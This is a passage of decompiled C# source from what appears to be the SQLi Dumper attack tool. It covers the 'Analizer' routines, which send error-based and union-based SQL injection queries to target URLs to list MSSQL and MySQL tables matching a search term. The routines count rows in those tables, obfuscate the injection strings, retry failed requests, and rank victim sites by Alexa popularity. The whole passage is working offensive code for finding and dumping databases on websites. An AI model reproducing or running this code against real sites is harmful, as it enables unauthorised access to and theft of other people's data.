                            Globals.UpDateStatus(__Analizer.Order, "Inecter", "[" + Conversions.ToString((int)(t.ID + 1)) + "/" + Conversions.ToString(this.__Analizer.Urls.Count) + "] Analizer thread, search table '" + sTable + "' [" + Conversions.ToString((int)(num4 + 1)) + "/" + Conversions.ToString(list.Count) + "] Checking Tables on DB '" + str13 + "'  | " + Globals.G_Utilities.GetDomain(t.URL));
                        }
                        num3 = this.AnalizerColumnCount(oType, sBuilUrl, "", str5, oMySQLCollation, bMSSQLCollateLatin);
                        str5 = "select top 1 x from ( select distinct top [x] (t.name) as x from [" + str13 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and t.name like " + Globals.G_Utilities.ConvertTextToSQLChar("%" + sTable + "%", false, "+", "char") + " order by x asc) sq order by x desc";
                        if (num3 == 0)
                        {
                            num4++;
                            continue;
                        }
                        int iIndex = 0;
                        goto Label_105D;
                    Label_0DAF:
                        str6 = MSSQL.Dump(sBuilUrl, "", "", null, false, (InjectionType) oType, "char", bMSSQLCollateLatin, iIndex, 0, "", "", "", str5, -1);
                        Globals.G_Tools.CheckSQLiStringOfuscation(ref str6);
                        if (this.AnalizerCheckForCancel())
                        {
                            return str2;
                        }
                        str19 = "";
                        str18 = "";
                        str3 = http.GetHTML(str6, enHTTPMethod.GET, ref str19, null, null, true, ref str18);
                        if (!string.IsNullOrEmpty(str3))
                        {
                            list8 = Globals.G_Dumper.ParseHtmlData(str3, oType);
                            if (list8.Count <= 0)
                            {
                                goto Label_106E;
                            }
                            strArray = Strings.Split(list8[0], Globals.COLLUMNS_SPLIT_STR, -1, CompareMethod.Binary);
                            if ((strArray.Length <= 0) || list3.Contains(strArray[0]))
                            {
                                goto Label_106E;
                            }
                            string str15 = "select cast(isnull(count(*),char(32)) as char) as x from [" + str13 + "]..[" + strArray[0] + "]";
                            num2 = this.AnalizerColumnCount(oType, sBuilUrl, "*", str15, oMySQLCollation, bMSSQLCollateLatin);
                            if (num2 > 0)
                            {
                                string str16 = "[" + Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] " + str13 + "." + strArray[0];
                                lTables.Add(str16);
                                list3.Add(strArray[0]);
                                num += num2;
                            }
                            else if (num2 == -1)
                            {
                                goto Label_106E;
                            }
                            num5 = 0;
                            Thread.Sleep(this.__Analizer.Delay);
                            if (!bAllResults)
                            {
                                goto Label_106E;
                            }
                            iIndex++;
                            if (iIndex > num3)
                            {
                                goto Label_106E;
                            }
                            goto Label_105D;
                        }
                        num5++;
                        if (num5 < this.__Analizer.Retry)
                        {
                            goto Label_105D;
                        }
                        goto Label_106E;
                    Label_0F83:;
                    Globals.UpDateStatus(__Analizer.Order, "Inecter", "[" + Conversions.ToString((int)(t.ID + 1)) + "/" + Conversions.ToString(this.__Analizer.Urls.Count) + "] Analizer thread, search table '" + sTable + "' [" + Conversions.ToString((int)(num4 + 1)) + "/" + Conversions.ToString(list.Count) + "]  DB '" + str13 + "' Table " + Conversions.ToString(iIndex) + " | " + Globals.G_Utilities.GetDomain(t.URL));
                        goto Label_0DAF;
                    Label_105D:
                        if (t.Threads != 1)
                        {
                            goto Label_0DAF;
                        }
                        goto Label_0F83;
                    Label_106E:
                        Thread.Sleep(this.__Analizer.Delay);
                        num4++;
                    }
                }
            Label_10B3:
                lTables.Sort();
                if (lTables.Count <= 0)
                {
                    return str2;
                }
                /*if ((__ScannerSearchCol != null) && __ScannerSearchCol.Visible)
                {
                    __ScannerSearchCol.Add(sBuilUrl, Utls.TypeToString(oType), sTable, (int) num, lTables);
                }*/
                str2 = "Search table '" + sTable + "' Count rows " + Strings.FormatNumber(num, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + ", Match in " + Strings.FormatNumber(lTables.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + " items ";
                /*try
                {*/
                    enumerator = lTables.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        string current = enumerator.Current;
                        str2 = str2 + "; " + current;
                    }
                /*}
                finally
                {
                    enumerator.Dispose();
                }*/
           /* }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }*/
            return str2;
        }

        private int AnalizerColumnCount(Types oType, string sBuilUrl, string sColumn, string sFrom, MySQLCollactions oMySQLCollation, bool bMSSQLCollateLatin)
        {
            int num2 = -1;
           /* try
            {*/
                using (HTTP http = new HTTP(this.__Analizer.TimeOut, false))
                {
                    string str2;
                    List<string> list2;
                    List<string> lColumn = new List<string> {
                        "count(" + sColumn + ")"
                    };
                    goto Label_0174;
                Label_0037:
                    str2 = MSSQL.Dump(sBuilUrl, "", "", lColumn, false, InjectionType.Error, "char", bMSSQLCollateLatin, 0, 0, "", "", "", sFrom, -1);
                Label_0068:
                    Globals.G_Tools.CheckSQLiStringOfuscation(ref str2);
                    string sPostData = "";
                    string sErrDesc = "";
                    string str = http.GetHTML(str2, enHTTPMethod.GET, ref sPostData, null, null, true, ref sErrDesc);
                    if (!this.AnalizerCheckForCancel())
                    {
                        int num3 = 0;
                        if (!string.IsNullOrEmpty(str))
                        {
                            list2 = Globals.G_Dumper.ParseHtmlData(str, oType);
                            if (list2.Count > 0)
                            {
                                goto Label_0196;
                            }
                        }
                        num3++;
                        if (num3 < this.__Analizer.Retry)
                        {
                            goto Label_0174;
                        }
                    }
                    return num2;
                Label_00DE:
                    str2 = MSSQL.Dump(sBuilUrl, "", "", lColumn, false, InjectionType.Union, "char", bMSSQLCollateLatin, 0, 0, "", "", "", sFrom, -1);
                    goto Label_0068;
                Label_0114:
                    str2 = MySQLWithError.Dump(sBuilUrl, oMySQLCollation, MySQLErrorType.DuplicateEntry, false, "", "", lColumn, 0, 1, "", "", "", sFrom);
                    goto Label_0068;
                Label_0144:
                    str2 = MySQLNoError.Dump(sBuilUrl, oMySQLCollation, false, false, "", "", lColumn, 0, 1, "", "", "", sFrom);
                    goto Label_0068;
                Label_0174:
                    switch (oType)
                    {
                        case Types.MySQL_No_Error:
                            goto Label_0144;

                        case Types.MySQL_With_Error:
                            goto Label_0114;

                        case Types.MSSQL_No_Error:
                            goto Label_00DE;

                        case Types.MSSQL_With_Error:
                            goto Label_0037;

                        default:
                            return 0;
                    }
                Label_0196:
                    if (Versioned.IsNumeric(list2[0]))
                    {
                        num2 = int.Parse(list2[0]);
                    }
                    return num2;
                }
           /* }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }*/
            return num2;
        }

	    private string AnalizerAlexaRank(string sURL)
	    {
		    string text;
		    /*try
		    {*/
			    string domain = Globals.G_Utilities.GetDomain(sURL);
			    sURL = string.Format("http://data.alexa.com/data?cli=10&dat=snbamz&url={0}", domain);
			    cXML cXML = new cXML(sURL, "SQLi_Dumper", ';');
			    text = string.Format("{0}:{1} [P:{2} R:{3} D:{4}] ({5})", new object[]
			    {
				    cXML.GetAttribute("COUNTRY", "RANK", "N/A"),
				    cXML.GetAttribute("COUNTRY", "CODE", "N/A"),
				    cXML.GetAttribute("POPULARITY", "TEXT", "N/A"),
				    cXML.GetAttribute("REACH", "RANK", "N/A"),
				    cXML.GetAttribute("RANK", "DELTA", "N/A"),
				    cXML.GetAttribute("SITE", "DESC", "N/A")
			    });
			    text = text.Replace("N/A:N/A", "N/A");
		    /*}
		    catch (Exception expr_E7)
		    {
			    ProjectData.SetProjectError(expr_E7);
			    Exception ex = expr_E7;
			    text = ex.Message;
			    ProjectData.ClearProjectError();
		    }*/
		    return text;
	    }
    }

}
